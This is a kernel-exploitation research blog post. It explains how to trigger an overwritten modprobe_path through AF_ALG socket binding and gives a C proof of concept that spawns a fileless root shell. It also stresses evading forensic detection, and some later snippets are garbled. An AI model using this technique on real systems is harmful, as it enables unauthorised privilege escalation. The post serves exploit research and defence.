@@ -1,0 +1,260 @@
+[Vulnerability Research](https://theori.io/blog/category/vulnerability-research)
+
+# Reviving the modprobe_path Technique: Overcoming search_binary_handler() Patch
+
+A new approach to the Overwriting modprobe_path technique is introduced, addressing changes in the Upstream kernel that prevent triggering via dummy files.
+
+[](https://theori.io/blog/author/frontier-squad-441623)
+
+![Frontier Squad's avatar](https://image.inblog.dev?url=https%3A%2F%2Fsource.inblog.dev%2Favatar%2F2025-03-19T01%3A55%3A44.612Z-23e176ba-3e60-4b9e-8fb6-a461fc9ddfc9&w=96&q=75)
+
+[Frontier Squad](https://theori.io/blog/author/frontier-squad-441623)
+
+Mar 15, 2025
+
+![Reviving the modprobe_path Technique: Overcoming search_binary_handler() Patch](https://image.inblog.dev?url=https%3A%2F%2Fsource.inblog.dev%2Ffeatured_image%2F2025-03-18T04%3A56%3A42.484Z-96378e90-b357-4e96-a412-28c5c8d78d43&w=3840&q=75)
+
+Contents
+
+[Introduction](#introduction-0)[Overwriting modprobe_path](#overwriting-modprobepath-1)[After the search_binary_handler() patch](#after-the-searchbinaryhandler-patch-2)[Using AF_ALG sockets](#using-afalg-sockets-3)[Fileless chaining](#fileless-chaining-4)[Conclusion](#conclusion-5)[Reference](#reference-6)
+
+## Introduction
+
+This blog post introduces a new method for utilizing the `Overwriting modprobe_path` technique. Since [this patch](https://web.git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=fa1bdca98d74472dcdb79cb948b54f63b5886c04) was merged last year, it is no longer possible to trigger `modprobe_path` in the Upstream kernel by executing dummy files.
+
+## Overwriting modprobe_path
+
+The `Overwriting modprobe_path` technique is, in simple terms, a method for achieving privilege escalation by overwriting the `modprobe_path` symbol when an `Arbitrary Address Write (AAW)` primitive is available. Due to its simplicity and effectiveness, this technique has been widely used by kernel exploit developers over the past few years.
+
+Since there are already numerous blog posts explaining this technique in detail, I will only provide a brief summary before moving on.
+
+First, in kernel versions prior to `v6.14-rc1`, when a user attempts to execute a dummy file starting with a magic number such as `\xff\xff\xff\xff`, the following call stack is triggered:
+
+```
+sys_execve()
+  => do_execve()
+    => do_execveat_common()
+      => bprm_execve()
+        => exec_binprm()
+          => search_binary_handler()
+            => request_module()
+              => __request_module()
+                => call_modprobe()
+                  => call_usermodehelper_exec()
+                    => queue_work(call_usermodehelper_exec_work)
+[ kworker ]
+call_usermodehelper_exec_work()
+  => call_usermodehelper_exec_sync()
+    => call_usermodehelper_exec_async()
+      => kernel_execve()
+```
+
+In the call stack, `call_modprobe()` retrieves the file path`[2]` from the global variable `modprobe_path[]` `[1]`, and then it calls `call_usermodehelper_exec()` `[3]`, which executes the file at the specified path in user space.
+
+```
+char modprobe_path[KMOD_PATH_LEN] = CONFIG_MODPROBE_PATH;    // [1]
+static int call_modprobe(char *orig_module_name, int wait)
+{
+        struct subprocess_info *info;
+        static char *envp[] = {
+                "HOME=/",
+                "TERM=linux",
+                "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
+                NULL
+        };
+        ...
+        argv[0] = modprobe_path;    // [2]
+        argv[1] = "-q";
+        argv[2] = "--";
+        argv[3] = module_name;  /* check free_modprobe_argv() */
+        argv[4] = NULL;
+        info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
+                                         NULL, free_modprobe_argv, NULL);
+        if (!info)
+                goto free_module_name;
+        ret = call_usermodehelper_exec(info, wait | UMH_KILLABLE);    // [3]
+```
+
+Typically, `modprobe_path[]` contains `/sbin/modprobe`, which points to the binary responsible for loading and unloading kernel modules. If the binary is executed through `call_usermodehelper_exec()`, it is run with `root` privileges.
+
+However, since the `modprobe_path[]` variable is writable `[1]`, it can be overwritten. If an attacker uses an AAW primitive to overwrite `modprobe_path[]` with the path of a file that executes a shell, and then triggers the execution by running a dummy file, the shell will be executed with `root` privileges, resulting in a successful privilege escalation.
+
+## After the search_binary_handler() patch
+
+Last November, [a patch removing legacy code from /fs/exec.c](https://web.git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=fa1bdca98d74472dcdb79cb948b54f63b5886c04) was merged into Upstream.
+
+Looking at the diff of this patch, the flow that calls `request_module()` has been completely removed `[4]`, so `search_binary_handler()` no longer invokes `request_module()`.
+
+```
+@@ -1760,17 +1756,7 @@ static int search_binary_handler(struct linux_binprm *bprm)
+        }
+        read_unlock(&binfmt_lock);
+        // [4]
+-       if (need_retry) {
+-               if (printable(bprm->buf[0]) && printable(bprm->buf[1]) &&
+-                   printable(bprm->buf[2]) && printable(bprm->buf[3]))
+-                       return retval;
+-               if (request_module("binfmt-%04x", *(ushort *)(bprm->buf + 2)) < 0)
+-                       return retval;
+-               need_retry = false;
+-               goto retry;
+-       }
+-
+-       return retval;
++       return -ENOEXEC;
+ }
+
+ /* binfmt handlers will call back into begin_new_exec() on success. */
+```
+
+To reach `call_modprobe()`, which references the `modprobe_path[]` variable, calling `request_module()` is essential. As a result of this patch, the method that has been used for several years—triggering `modprobe_path` by executing a dummy file—is no longer viable.
+
+However, there is a simple idea. Since `request_module()` references the `modprobe_path[]` variable when attempting to load a module, if we can find another execution flow that calls `request_module()`, this technique can still be used.
+
+## Using AF_ALG sockets
+
+There are numerous call stacks that invoke `request_module()`. Among them, we need to identify a flow that meets the following conditions:
+
+1.  Does not require `capabilities` when triggered
+
+2.  Part of a subsystem included in major distributions
+
+3.  Reaches `request_module()` without excessive processing to ensure exploit stability
+
+One of the subsystems that meets all the conditions is the `AF_ALG` socket. `AF_ALG` is a socket-based interface that allows user space to access the kernel's cryptographic API, but in this technique, it is used without invoking any cryptographic functionality.
+
+When `bind()` is called on this socket, it triggers the `alg_bind()` function. This function searches for the `type` corresponding to the user-provided `sa->salg_type` `[5]`, and if not found, it calls `request_module()` to attempt loading the `"algif-%s"` module `[6]`.
+
+```
+static const struct proto_ops alg_proto_ops = {
+        .family         =       PF_ALG,
+        .owner          =       THIS_MODULE,
+        ...
+        .bind           =       alg_bind,
+        .release        =       af_alg_release,
+        .setsockopt     =       alg_setsockopt,
+        .accept         =       alg_accept,
+};
+static int alg_bind(struct socket *sock, struct sockaddr *uaddr, int addr_len)
+{
+        const u32 allowed = CRYPTO_ALG_KERN_DRIVER_ONLY;
+        struct sock *sk = sock->sk;
+        struct alg_sock *ask = alg_sk(sk);
+        struct sockaddr_alg_new *sa = (void *)uaddr;
+        const struct af_alg_type *type;
+        void *private;
+        int err;
+        ...
+        sa->salg_type[sizeof(sa->salg_type) - 1] = 0;
+        sa->salg_name[addr_len - sizeof(*sa) - 1] = 0;
+        type = alg_get_type(sa->salg_type);    // [5]
+        if (PTR_ERR(type) == -ENOENT) {
+                request_module("algif-%s", sa->salg_type);    // [6]
+                type = alg_get_type(sa->salg_type);
+        }
+```
+
+If a dummy string that does not correspond to a valid cryptographic type is passed to `sa->salg_type`, `request_module()` will always be invoked. Ultimately, this allows execution of the file stored in the `modprobe_path[]` variable with `root` privileges.
+
+## Fileless chaining
+
+The method using the `AF_ALG` socket does not require creating a file, unlike the approach that triggers execution by running a `/tmp/dummy` file starting with magic number `\xff\xff\xff\xff`. Additionally, when chained with [memfd_create() technique developed by lau](https://pwning.tech/nftables/#514-overwriting-modprobepath), a fully fileless technique can still be used. This significantly reduces the likelihood of detection by security software and forensic analysis.
+
+The complete PoC is as follows:
+
+```
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <linux/if_alg.h>
+#include <fcntl.h>
+#include <sys/mman.h>
+
+#define MODPROBE_SCRIPT "#!/bin/sh\\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\\n"
+
+int main(void)
+{
+        char fake_modprobe[40] = {0};
+        struct sockaddr_alg sa;
+        pid_t pid = getpid();
+
+        int modprobe_script_fd = memfd_create("", MFD_CLOEXEC);
+        int shell_stdin_fd = dup(STDIN_FILENO);
+        int shell_stdout_fd = dup(STDOUT_FILENO);
+
+        dprintf(modprobe_script_fd, MODPROBE_SCRIPT, pid, shell_stdin_fd, pid, shell_stdout_fd);
+        snprintf(fake_modprobe, sizeof(fake_modprobe), "/proc/%i/fd/%i", pid, modprobe_script_fd);
+
+        // Overwriting modprobe_path with fake_modprobe here...
+
+        int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
+        if (alg_fd < 0) {
+                perror("socket(AF_ALG) failed");
+                return 1;
+        }
+
+        memset(&sa, 0, sizeof(sa));
+        sa.salg_family = AF_ALG;
+        strcpy((char *)sa.salg_type, "V4bel");  // dummy string
+        bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
+
+        return 0;
+}
+```
+
+First, `memfd_create()` is used to create an anonymous memory mapping. This mapping is then populated with `MODPROBE_SCRIPT`, which launches a remote shell and redirects execution to the current process `[7]`. After that, the string `/proc//fd/`, which points to this anonymous memory mapping, is stored in the `fake_modprobe` variable `[8]`.
+
+```
+#define MODPROBE_SCRIPT "#!/bin/sh\\n/bin/sh 0/proc/%u/fd/%u 2>&1\\n"
+
+int main(void)
+{
+        char fake_modprobe[40] = {0};
+        struct sockaddr_alg sa;
+        pid_t pid = getpid();
+
+        int modprobe_script_fd = memfd_create("", MFD_CLOEXEC);
+        int shell_stdin_fd = dup(STDIN_FILENO);
+        int shell_stdout_fd = dup(STDOUT_FILENO);
+
+        dprintf(modprobe_script_fd, MODPROBE_SCRIPT, pid, shell_stdin_fd, pid, shell_stdout_fd);    // [7]
+        snprintf(fake_modprobe, sizeof(fake_modprobe), "/proc/%i/fd/%i", pid, modprobe_script_fd);    // [8]
+```
+
+Using the AAW primitive, the `modprobe_path[]` is overwritten with `fake_modprobe`. Then, an `AF_ALG` socket is created, followed by a call to `bind()` with a dummy string as an argument `[9]`. This make the kernel execute `alg_bind() → request_module()`, leading to the execution of `/proc//fd/`, which was written to `modprobe_path[]`. At this point, a `root` shell is executed and redirected to the current process, granting a remote shell and achieving privilege escalation.
+
+```
+        int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
+        if (alg_fd < 0) {
+                perror("socket(AF_ALG) failed");
+                return 1;
+        }
+
+        memset(&sa, 0, sizeof(sa));
+        sa.salg_family = AF_ALG;
+        strcpy((char *)sa.salg_type, "V4bel");  // [9] dummy string 
+        bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
+```
+
+To apply this technique within a `mount namespace`, such as in environments like kernelCTF, the only additional step required is implementing PID guessing as [described in lau’s approach](https://pwning.tech/nftables/#514-overwriting-modprobepath).
+
+## Conclusion
+
+In this post, I introduced a simple and effective method to utilize the `modprobe_path` technique even after the `/fs/exec.c` patch. Additionally, by chaining it with lau's technique, I demonstrated that the `modprobe_path` technique can still be used without files.
+
+Currently, the `/fs/exec.c` patch has only been merged into the Upstream kernel and has not yet been backported to the stable tree or distribution kernels. Therefore, the dummy file execution technique remains available on distribution kernels. In the future, once the patch is backported, you can leverage various flows that invoke `request_module()`, such as `AF_ALG`.
+
+## Reference
+
+- [https://github.com/smallkirby/kernelpwn/blob/master/technique/modprobe_path.md](https://github.com/smallkirby/kernelpwn/blob/master/technique/modprobe_path.md)
+
+- [https://pwning.tech/nftables/](https://pwning.tech/nftables/)
+
+Share article
+
+Contents
+
+[Introduction](#introduction-0)[Overwriting modprobe_path](#overwriting-modprobepath-1)[After the search_binary_handler() patch](#after-the-searchbinaryhandler-patch-2)[Using AF_ALG sockets](#using-afalg-sockets-3)[Fileless chaining](#fileless-chaining-4)[Conclusion](#conclusion-5)[Reference](#reference-6)
